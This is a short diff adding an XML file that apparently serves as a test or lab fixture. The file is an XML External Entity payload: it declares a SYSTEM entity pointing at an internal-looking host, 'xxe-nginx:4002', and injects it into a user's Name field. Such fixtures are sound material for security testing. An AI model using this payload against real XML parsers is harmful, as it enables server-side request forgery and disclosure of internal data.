@@ -1,0 +1,8 @@
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [ <!ENTITY pwnd SYSTEM "http://xxe-nginx:4002" > ]>
+<Users>
+  <User>
+    <Name>&pwnd;</Name>
+    <Email>johndoe@gmail.com</Email>
+  </User>
+</Users>
